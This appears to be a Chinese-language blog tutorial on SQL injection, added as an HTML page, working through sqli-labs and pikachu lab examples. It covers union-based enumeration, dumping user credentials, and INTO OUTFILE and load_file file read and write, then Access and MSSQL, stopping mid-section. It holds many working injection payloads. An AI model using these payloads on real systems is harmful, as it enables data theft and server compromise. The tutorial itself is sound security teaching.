@@ -1,0 +1,994 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>SQL注入全集 | Lovy</title>
+    <meta name="author" content="Lovy" />
+    <meta name="description" content="come on" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+    <canvas id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"></canvas>
+    <script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+    <script src="/js/fireworks.js"></script>
+    <canvas id="background" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"></canvas>
+    <script src="/js/background.js"></script>
+    <div id="cursor"></div>
+    <link rel="stylesheet" href="/css/cursor.min.css">
+    <script src="/js/cursor.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>LOVY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;LOVY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>SQL注入全集</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/21
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id=""><a href="#" class="headerlink" title=""></a><span id="more"></span></h2><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h2><p>SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p>
+<h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>SQL注入本质上来讲就是拼接字符串，通过输入额外的信息破坏外后端脚本原有的查询语句结构，从而达成注入的目的。</p>
+<p><strong>以下列代码和输入为例：</strong><br>如果GET传参</p>
+<pre><code>php  
+// php后端代码
+$id = $_REQUEST[&#39;id&#39;];
+$sql = &quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+$result = mysql_query($sql);
+</code></pre>
+<pre><code>id=1  
+</code></pre>
+<p>那么在后端<code>$sql</code>的值为  </p>
+<pre><code>mysql
+SELECT * FROM users WHERE id=1 LIMIT 0,1
+</code></pre>
+<p>假如传参的值为  </p>
+<pre><code>id==-1 union select 1,database() --+  
+</code></pre>
+<p>这样后端的语句就变成了显示当前数据库名，而不执行union前面的语句   </p>
+<pre><code>mysql
+SELECT * FROM users WHERE id=-1 union select 1,database() --+ LIMIT 0,1
+</code></pre>
+<blockquote>
+<p>解释一下变化：</p>
+<ol>
+<li>其中id从1变为了-1，是因为id&#x3D;-1时$sql语句中”SELECT * FROM users WHERE id&#x3D;-1”会语句错误从而导致不执行，只执行后面的”select 1,database()”</li>
+<li>“union select 1,database() –+”其中假设有两个字段是可以显示了，因为使用”union”时要与”union”前面查询的字段一致，一般使用”order by”来确定字段数。这条语句主要是拿来查询数据库名的，结果会显示在字段2显示的标签上<br>因此SQL注入产生的<strong>主要原因</strong>有：</li>
+</ol>
+</blockquote>
+<ul>
+<li><p>可控变量 (例如：例子中的”$id &#x3D; $_REQUEST[‘id’];”)</p>
+</li>
+<li><p>带入数据库查询 (例如：例子中的”$result &#x3D; mysql_query($sql);”)</p>
+</li>
+<li><p>变量未存在过滤或过滤不严谨</p>
+</li>
+</ul>
+<h2 id="MySQL注入"><a href="#MySQL注入" class="headerlink" title="MySQL注入"></a>MySQL注入</h2><p><img src="https://leaf-image.oss-cn-hangzhou.aliyuncs.com/1623825461063-3176cffa-46d5-494a-9149-34dd9d0b44b2.png" alt="mysql注入-小迪.png"></p>
+<h3 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h3><p><code>information_schema</code>：在MYSQL<strong>5.0以上</strong>版本中，mysql存在一个自带数据库名为<strong>information_schema</strong>，它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。</p>
+<ul>
+<li>schemata表：当前 mysql 实例中所有数据库的信息。<code>show databases;</code> 命令从这个表获取数数据</li>
+</ul>
+<pre><code>mysql
+  information_schema下：select * from schemata;
+  跨库查询：select * from information_schema.schemata;  
+</code></pre>
+<ul>
+<li>tables表：存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。<code>show tables from</code>; 命令从这个表获取结果。</li>
+<li>columns表：存储表中的列信息，包括表有多少列、每个列的类型等。<code>show columns from schemaname.tablename</code> 命令从这个表获取结果。</li>
+<li>user_privileges表：用户权限表。内容源自 mysql.user 授权表。是非标准表。<br>数据库中符号<code>.</code>代表下一级，如<code>security.user</code>表示security数据库下的user表名  <blockquote>
+<ol>
+<li>information_schema.schemata：记录所有数据库名的表</li>
+<li>information_schema.tables：记录所有表名信息的表</li>
+<li>information_schema.columns：记录所有列名信息的表</li>
+<li>table_name: 表名</li>
+<li>column_name：列名</li>
+<li>table_schema：数据库名</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+<h3 id="常用mysql函数"><a href="#常用mysql函数" class="headerlink" title="常用mysql函数"></a>常用mysql函数</h3><pre><code>system_user() 系统用户名
+user() 用户名
+current_user 当前用户名
+session_user()连接数据库的用户名
+database() 数据库名
+version() MYSQL数据库版本
+load_file() MYSQL读取本地文件的函数
+@@datadir 读取数据库路径
+@@basedir MYSQL 安装路径
+@@version_compile_os 操作系统
+
+多条数据显示函数：
+concat()
+group_concat()
+concat_ws() 
+</code></pre>
+<h3 id="MySqL联合查询注入步骤"><a href="#MySqL联合查询注入步骤" class="headerlink" title="MySqL联合查询注入步骤"></a>MySqL联合查询注入步骤</h3><h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>方法一：and 1&#x3D;1 页面正常、and 1&#x3D;2 页面错误，可能存在注入点</p>
+<p>方法二：在注入点随意输入数据，若页面报错则存在注入。如：id&#x3D;1为有回显的，id&#x3D;1asdasd为报错，则id为注入点  </p>
+<h5 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h5><ol>
+<li>单引号闭合：</li>
+</ol>
+<pre><code>php  
+$query=&quot;select name,age,gender from t_students where id=&#39;&#123;$_GET[&#39;id&#39;]&#125;&#39;&quot;;  
+</code></pre>
+<p>其中传入的”$_GET[‘id’]”被<code>&#39;&#39;</code>包起来了</p>
+<ol start="2">
+<li>双引号闭合</li>
+</ol>
+<pre><code>php  
+$id=&#39;&quot;&#39;.$_GET[&#39;id&#39;].&#39;&quot;&#39;;  
+$query=&quot;select name,age,gender from t_students where id=&#123;$id&#125;&quot;;  
+</code></pre>
+<ol start="3">
+<li>一个较难判断闭合的例子</li>
+</ol>
+<pre><code>php  
+$sql = &quot;select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;  
+</code></pre>
+<p>将这个语句分为三部分看  </p>
+<pre><code>第一部分：  
+&quot;select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;  
+第二部分：  
+.$_GET[&#39;id&#39;].  
+第三部分：  
+&quot;&#39; limit 1;&quot;;        
+</code></pre>
+<p>第二部分中通过<code>.</code>的方式连接前后两部分，而第一部分中用双引号包括的最后面还剩一个<code>&#39;</code>，第三部分中用双引号包括的最前面还剩一个<code>&#39;</code>，因此最后传入id参数，解析为<code>id=&#39;1&#39;</code>，是单引号闭合</p>
+<h5 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h5><pre><code>php
+$query=&quot;select name,age,gender from t_students where id=&#123;$_GET[&#39;id&#39;]&#125;&quot;;      
+</code></pre>
+<p>传入的参数直接与id进行比较</p>
+<h4 id="判断注入字段数"><a href="#判断注入字段数" class="headerlink" title="判断注入字段数"></a>判断注入字段数</h4><p>一般采取<code>order by</code>来判断与union前的语句相同的字段数，因为union语句规定前面查询的字段数要与后面的字段数相等</p>
+<pre><code>`mysql
+1&#39; union select 1,2,3;#
+1&#39; order by 3;#  
+</code></pre>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
+<li>数据库版本：version()</li>
+<li>数据库名字：database()</li>
+<li>数据库用户：user()</li>
+<li>操作系统：@@version_compile_os</li>
+</ul>
+<h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><p>查询数据库名  </p>
+<pre><code>mysql
+1&#39; union select 1,database() #  
+</code></pre>
+<p>查询表名  </p>
+<pre><code>mysql
+1&#39; union select group_concat(table_name),database() from information_schema.tables where table_schema = database() #
+</code></pre>
+<p>查字段名  </p>
+<pre><code>mysql
+1&#39; union select group_concat(column_name),database() from information_schema.columns where table_schema = database() #
+</code></pre>
+<p>查询数据  </p>
+<pre><code>mysql
+1&#39; union select group_concat(column_name) from table_name #  
+</code></pre>
+<h3 id="高权限注入跨库查询"><a href="#高权限注入跨库查询" class="headerlink" title="高权限注入跨库查询"></a>高权限注入跨库查询</h3><p><strong>以下查询都以sqli-labs第一关为例，下方为页面关键源码</strong>  </p>
+<pre><code>php
+$id=$_GET[&#39;id&#39;];
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+$result=mysql_query($sql);  
+</code></pre>
+<h3 id="高权限注入跨库查询-1"><a href="#高权限注入跨库查询-1" class="headerlink" title="高权限注入跨库查询"></a>高权限注入跨库查询</h3><p><strong>以下查询都以sqli-labs第一关为例，下方为页面关键源码</strong></p>
+<h4 id="跨站查询的思路"><a href="#跨站查询的思路" class="headerlink" title="跨站查询的思路"></a>跨站查询的思路</h4><p>通过information_schema表特性，记录库名，表名，列名对应表</p>
+<ol>
+<li><p>information_schema.schemata：记录所有数据库名的表</p>
+</li>
+<li><p>information_schema.tables：记录所有表名信息的表</p>
+</li>
+<li><p>information_schema.columns：记录所有列名信息的表</p>
+</li>
+</ol>
+<h4 id="获得所有数据库名"><a href="#获得所有数据库名" class="headerlink" title="获得所有数据库名"></a>获得所有数据库名</h4><pre><code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+
+</code></pre>
+<p>成功查询到除了当前数据库(security)之外的数据库</p>
+<h4 id="获取pikachu数据库中表名"><a href="#获取pikachu数据库中表名" class="headerlink" title="获取pikachu数据库中表名"></a>获取pikachu数据库中表名</h4><pre><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pikachu&#39; --+  
+</code></pre>
+<p>成功跨站查询到pikachu靶场中的数据库下的表名</p>
+<h4 id="获取pikachu数据库中users数据表的列名"><a href="#获取pikachu数据库中users数据表的列名" class="headerlink" title="获取pikachu数据库中users数据表的列名"></a>获取pikachu数据库中users数据表的列名</h4><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;pikachu&#39; --+
+</code></pre>
+<p>成功查询到列名</p>
+<blockquote>
+<p>这条语句中的<code>and table_schema=&#39;dvwa&#39;</code>是建议加上去的，如果不指定数据库，倘若其他数据库中也有users表，那么页面会一起显示在上面的</p>
+</blockquote>
+<h4 id="获取pikachu中users表中的数据"><a href="#获取pikachu中users表中的数据" class="headerlink" title="获取pikachu中users表中的数据"></a>获取pikachu中users表中的数据</h4><pre><code>?id=-1&#39; union select 1,user,password from pikachu.users --+  
+</code></pre>
+<p>成功跨站获取到pikachu数据库中用户和密码</p>
+<h3 id="高权限注入文件读写"><a href="#高权限注入文件读写" class="headerlink" title="高权限注入文件读写"></a>高权限注入文件读写</h3><p>文件读取和写入操作需要知道文件的绝对路径，以下是常见的路径获取方式</p>
+<ol>
+<li><p>报错显示</p>
+</li>
+<li><p>遗留文件</p>
+</li>
+<li><p>漏洞报错</p>
+</li>
+<li><p>平台配置文件</p>
+</li>
+<li><p>爆破</p>
+</li>
+</ol>
+<h4 id="文件写入操作"><a href="#文件写入操作" class="headerlink" title="文件写入操作"></a>文件写入操作</h4><pre><code>?id=-1&#39; union select 1,&#39;&lt;?php phpinfo() ?&gt;&#39;,3 into outfile &#39;E:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-1\\1.php&#39;--+
+</code></pre>
+<blockquote>
+<p><strong>注意：</strong></p>
+<ol>
+<li><p>文件写入读取操作需要修改mysql文件夹下的my.ini，在其中添加”secure_file_priv&#x3D;”，然后重启mysql服务才能进行读取和写入操作</p>
+</li>
+<li><p>上方payload中的文件路径一定要是<strong>绝对路径</strong>，而且其中的<code>\</code>要用<code>\\</code>来代替，否则会被转义掉（或者用<code>/</code>）</p>
+</li>
+</ol>
+</blockquote>
+<h4 id="文件读取操作"><a href="#文件读取操作" class="headerlink" title="文件读取操作"></a>文件读取操作</h4><pre><code>?id=-1&#39; union select 1,load_file(&#39;E:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-1\\1.php&#39;),3 --+
+</code></pre>
+<p><img src="https://leaf-image.oss-cn-hangzhou.aliyuncs.com/1670945447756-4f992846-bfab-4dd6-909a-0f2970200070.png" alt="13-9.png">  </p>
+<h4 id="常见写入问题"><a href="#常见写入问题" class="headerlink" title="常见写入问题"></a>常见写入问题</h4><p>魔术引号开关：magic_quotes_gpc（在php.ini中设置，默认为关）</p>
+<p>用上方相同的文件读取payload，然后我们在源文件中打印出语句</p>
+<p><img src="https://leaf-image.oss-cn-hangzhou.aliyuncs.com/1670945454567-a0ae3816-6605-4cec-9397-bb541f082612.png" alt="img"><br>发现在<code>\、&#39;</code>后面多了个<code>&quot;\&quot;</code>，</p>
+<blockquote>
+<p>在magic_quotes_gpc&#x3D;On的情况下，如果输入的数据有单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线<br>而php中有一个addslashes()函数，作用与magic_quotes_gpc相似，都可以当作防止通过SQL注入来读取写入文件  </p>
+</blockquote>
+<h3 id="SQL注入之类型及提交注入"><a href="#SQL注入之类型及提交注入" class="headerlink" title="SQL注入之类型及提交注入"></a>SQL注入之类型及提交注入</h3><h4 id="SQL注入点类型分类"><a href="#SQL注入点类型分类" class="headerlink" title="SQL注入点类型分类"></a>SQL注入点类型分类</h4><h5 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h5><pre><code>mysql
+# SQL语句大概为：
+$sql=select * from 表名 where id=$id;
+# 需要构造的注入语句为：$id = 1 and 1=1
+$sql=select * from 表名 where id=1 and 1=1;  
+</code></pre>
+<h5 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h5><pre><code>mysql
+# SQL语句大概为：
+$sql=select * from 表名 where id=&#39;$id&#39;;
+# 需要构造的注入语句为：$id = 1&#39; and &#39;1&#39;=&#39;1
+$sql=select * from 表名 where id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;;  
+</code></pre>
+<h5 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h5><pre><code>mysql
+# SQL语句大概为：
+$sql=select * from 表名 where 字段 like &#39;%$id%&#39;;
+# 需要构造的注入语句为：$id = 1%&#39; and &#39;%1%&#39;=&#39;%1
+$sql=select * from 表名 where 字段 like &#39;%1%&#39; and &#39;%1%&#39;=&#39;%1%&#39;;  
+</code></pre>
+<h5 id="JSON型"><a href="#JSON型" class="headerlink" title="JSON型"></a>JSON型</h5><pre><code>mysql
+# SQL语句大概为：
+$sql=&quot;SELECT * FROM 表名 WHERE 字段=&#39;&#123;$username&#125;&#39;&quot;;
+# 需要构造的注入语句为：json=&#123;&quot;username&quot;:&quot;1&#39; union select 1,2,3#&quot;&#125;
+$sql=&quot;SELECT * FROM 表名 WHERE 字段=&#39;1&#39; union select 1,2,3;  
+</code></pre>
+<h4 id="SQL提交方式分类"><a href="#SQL提交方式分类" class="headerlink" title="SQL提交方式分类"></a>SQL提交方式分类</h4><h5 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h5><p>get注入方式比较常见，主要是通过<strong>URL</strong>中传输数据到后台，带入到数据库中去执行，可利用联合注入方式直接注入  </p>
+<h5 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h5><p>post提交方式主要适用于表单的提交，用于登录框的注入</p>
+<p>方法：利用BurpSuite抓包进行重放修改内容进行，和get差别是需要借助抓包工具进行测试，返回结果主要为代码，也可转化为网页显示</p>
+<h5 id="REQUEST"><a href="#REQUEST" class="headerlink" title="REQUEST"></a>REQUEST</h5><p>既可以使用GET方式注入，也可以使用POST方式注入</p>
+<h5 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h5><p>header注入，该注入是指利用后端验证客户端信息（比如常用的<strong>cookie</strong>验证）或者通过header中获取客户端的一些信息（比如<strong>User-Agent</strong>用户代理等其他header字段信息），因为这些信息在某些地方是会和其他信息一起存储到数据库中，然后再在前台显示出来，又因为后台没有经过相对应的信息处理所以构成了SQL注入。</p>
+<h4 id="字符型注入测试"><a href="#字符型注入测试" class="headerlink" title="字符型注入测试"></a>字符型注入测试</h4><p><strong>以sqli-labs less 5、6为例</strong></p>
+<h5 id="sqli-labs-less-5-单引号字符型注入-布尔盲注"><a href="#sqli-labs-less-5-单引号字符型注入-布尔盲注" class="headerlink" title="sqli-labs less 5(单引号字符型注入+布尔盲注)"></a>sqli-labs less 5(单引号字符型注入+布尔盲注)</h5><p>PHP主要源代码</p>
+<pre><code>php
+$id=$_GET[&#39;id&#39;];
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+if($row)&#123;
+    echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;;	
+    echo &#39;You are in...........&#39;;
+    echo &quot;&lt;br&gt;&quot;;
+    echo &quot;&lt;/font&gt;&quot;;
+&#125;
+else &#123;
+    echo &#39;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#39;;
+    print_r(mysql_error());
+    echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	
+    echo &#39;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#39;;	
+&#125;  
+</code></pre>
+<p>通过源代码分析，传入的id在$sql变量中加上了两个单引号，表示被当作字符处理，因此我们SQL注入时应该要闭合单引号先  </p>
+<pre><code>sql
+# 传入的id值：
+?id=1&#39;and&#39;1&#39;=&#39;1
+# $sql语句：
+SELECT * FROM users WHERE id=&#39;1&#39;and&#39;1&#39;=&#39;1&#39; LIMIT 0,1  
+</code></pre>
+<p>通过页面回显，判断出为<strong>布尔盲注</strong>，页面只有两种状态，一种是输入正确时回显<code>You are in...........</code>，另一种输入错误时无回显  </p>
+<pre><code>?id=1&#39; and&#39;1&#39;=&#39;1
+?id=1&#39; and&#39;1&#39;=&#39;2  
+</code></pre>
+<h2 id="Oracle-MongoDB等注入"><a href="#Oracle-MongoDB等注入" class="headerlink" title="Oracle,MongoDB等注入"></a>Oracle,MongoDB等注入</h2><p><img src="https://leaf-image.oss-cn-hangzhou.aliyuncs.com/1670945719477-a3d1bb44-f529-414e-b047-c5ae7bc23c81.png" alt="img"></p>
+<h3 id="数据库分类"><a href="#数据库分类" class="headerlink" title="数据库分类"></a>数据库分类</h3><h4 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h4><p>关系型数据库的概念：<br>关系型数据库指的是使用关系模型（二维表格模型）来组织数据的数据库。</p>
+<p>常见关系型数据库管理系统：<br>Oracle、MySql、Microsoft SQL Server、SQLite、PostgreSQL、IBM DB2</p>
+<p>关系型数据库的优势：</p>
+<ol>
+<li>采用二维表结构非常贴近正常开发逻辑（关系型数据模型相对层次型数据模型和网状型数据模型等其他模型来说更容易理解）；</li>
+<li>支持通用的SQL（结构化查询语言）语句；</li>
+<li>丰富的完整性大大减少了数据冗余和数据不一致的问题。并且全部由表结构组成，文件格式一致；</li>
+<li>可以用SQL句子多个表之间做非常繁杂的查询；</li>
+<li>关系型数据库提供对事务的支持，能保证系统中事务的正确执行，同时提供事务的恢复、回滚、并发控制和死锁问题的解决。</li>
+<li>数据存储在磁盘中，安全可靠。</li>
+</ol>
+<p>关系型数据库存在的不足:</p>
+<ol>
+<li>高并发读写能力差：网站类用户的并发性访问非常高，而一台数据库的最大连接数有限，且硬盘 I&#x2F;O 有限，不能满足很多人同时连接。</li>
+<li>海量数据情况下读写效率低：对大数据量的表进行读写操作时，需要等待较长的时间等待响应。</li>
+<li>可扩展性不足：不像web server和app server那样简单的添加硬件和服务节点来拓展性能和负荷工作能力。</li>
+<li>数据模型灵活度低：关系型数据库的数据模型定义严格，无法快速容纳新的数据类型（需要提前知道需要存储什么样类型的数据）</li>
+</ol>
+<h4 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h4><p>非关系型数据库(NO SQL)的概念：<br>非关系型数据库又被称为 NoSQL（Not Only SQL )，意为不仅仅是 SQL。通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定，常用于存储非结构化的数据。</p>
+<p>常见的NOSQL数据库：</p>
+<ol>
+<li>键值数据库：Redis、Memcached、Riak</li>
+<li>列族数据库：Bigtable、HBase、Cassandra</li>
+<li>文档数据库：MongoDB、CouchDB、MarkLogic</li>
+<li>图形数据库：Neo4j、InfoGrid</li>
+</ol>
+<p>非关系型数据库的优势：</p>
+<ol>
+<li>系型数据库存储数据的格式可以是 key-value 形式、文档形式、图片形式等。使用灵活，应用场景广泛，而关系型数据库则只支持基础类型。</li>
+<li>速度快，效率高。 NoSQL 可以使用硬盘或者随机存储器作为载体，而关系型数据库只能使用硬盘。</li>
+<li>海量数据的维护和处理非常轻松，成本低。</li>
+<li>非关系型数据库具有扩展简单、高并发、高稳定性、成本低廉的优势。</li>
+<li>可以实现数据的分布式处理。</li>
+</ol>
+<p>非关系型数据库存在的不足:</p>
+<ol>
+<li>系型数据库暂时不提供 SQL 支持，学习和使用成本较高。</li>
+<li>非关系数据库没有事务处理，无法保证数据的完整性和安全性。适合处理海量数据，但是不一定安全。</li>
+<li>功能没有关系型数据库完善。</li>
+<li>复杂表关联查询不容易实现。</li>
+</ol>
+<h3 id="ACCESS注入"><a href="#ACCESS注入" class="headerlink" title="ACCESS注入"></a>ACCESS注入</h3><ol>
+<li>access数据库结构：<br> 表名—-&gt;列名—-&gt;内容数据</li>
+</ol>
+<p>  不像其他的数据库一样、里面创建多个数据库然后才是表再是内容、而access的话只有若干张表。</p>
+<ol start="2">
+<li><p>access数据库类型判断：<br> 通过<code>and (select count(*) from msysobjects)&gt;0</code>判断是否为access，如果返回错误页面证明数据库为access。<br> msysobjects是access数据库的系统表之一，access数据库共有三个系统表，分别为<code>msysobjects</code> 、<code>msysqueries</code>、<code>msysrelationships</code>，这三个系统表在web环境下是没有访问权 限的，因此可以通过错误回显来判断access数据库</p>
+</li>
+<li><p>access注入基本流程<br> 判断字段数 &#x3D;&#x3D;&gt; 猜测表名 &#x3D;&#x3D;&gt; 判断字段回显位置 &#x3D;&#x3D;&gt; 猜解关键字段名并获取关键字段的数据<br>(1)判断字段数</p>
+</li>
+</ol>
+<pre><code>?id=1 order by 数量  
+</code></pre>
+<p>(2)猜测表名(需要暴力)  </p>
+<pre><code>?id=1 and exists(select count(*) from 表名)  
+</code></pre>
+<p>(3)判断字段回显位置  </p>
+<pre><code>?id=1 union select 1,2,3,4,5 from 表名  
+</code></pre>
+<p>(4)猜解关键字段名并获取关键字段的数据  </p>
+<pre><code>?id=1 union select 字段名,字段名,字段名,4,5 from 表名  
+</code></pre>
+<h3 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h3><ol>
+<li><p>介绍：<br> SQL Server 是一个关系数据库管理系统。经常与<code>asp</code>或者<code>aspx</code>一起使用，SQL Server是一个可扩展的、高性能的、为分布式客户机&#x2F;服务器计算所设计的数据库管理系统，实现了与WindowsNT的有机结合，提供了基于事务的企业级信息管理系统方案。</p>
+</li>
+<li><p>系统自带库：<br> MSSQL安装后默认带了6个数据库，其中4个系统级库：<code>master</code>，<code>model</code>，<code>tempdb</code>和<code>msdb</code>；2个示例库：<code>Northwind Traders</code>和<code>pubs</code>。<br> (1)master：主要为系统控制数据库，其中包括了所有配置信息、用户登录信息和当前系统运行情况。<br> (2)model：模版数据库<br> (3)tempdb：临时容器<br> (4)msdb：主要为用户使用，所有的告警、任务调度等都在这个数据库中。</p>
+</li>
+<li><p>系统自带表:<br> MSSQL数据库与Mysql数据库一样，有安装自带的数据表<code>sysobjects</code>和<code>syscolumns</code>等，其中需要了解的就是这两个数据表。<br> (1)sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。<br> (2)syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。</p>
+</li>
+<li><p>MSSQL注入基本流程<br>  (1)判断数据库是否为MSSQL</p>
+</li>
+</ol>
+<pre><code>?id=2 and (select count(*) from sysobjects)&gt;0
+</code></pre>
+<p>  (2)判断当前字段  </p>
